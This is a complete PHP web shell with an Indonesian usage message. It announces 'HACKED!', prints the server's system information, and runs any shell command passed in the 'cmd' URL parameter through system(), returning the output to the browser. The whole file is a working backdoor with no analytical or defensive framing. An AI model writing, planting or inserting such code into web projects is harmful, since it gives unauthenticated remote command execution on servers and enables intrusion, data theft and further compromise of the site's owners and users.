<?php
echo "HACKED! Server Info: " . php_uname() . "<br>";
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Gunakan parameter ?cmd=perintah untuk eksekusi remote command.";
}
